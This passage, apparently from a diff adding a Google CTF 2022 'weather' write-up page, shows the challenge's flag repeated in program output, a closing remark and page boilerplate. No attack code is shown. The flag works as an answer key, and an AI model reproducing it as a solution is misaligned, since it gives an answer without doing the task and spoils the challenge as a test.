+CTF{DoesAnyoneEvenReadFlagsAnymore?}
+CTF{DoesAnyoneEvenReadFlagsAnymore?}
+CTF{DoesAnyoneEvenReadFlagsAnymore?}
+...</code></pre></figure>
+
+<p>In hindsight, the challenge wasn’t too difficult, but it was a really nice entry to hardware challenges and even learned a thing or two in this ride :)</p>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=Google Capture The Flag 2022 - weather&amp;url=https://kileak.github.io/ctf/2022/googlectf22-weather/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2022/googlectf22-weather/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2022/googlectf22-weather';
+        var disqus_title = 'Google Capture The Flag 2022 - weather';
+        var disqus_url = 'https://kileak.github.io/ctf/2022/googlectf22-weather';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
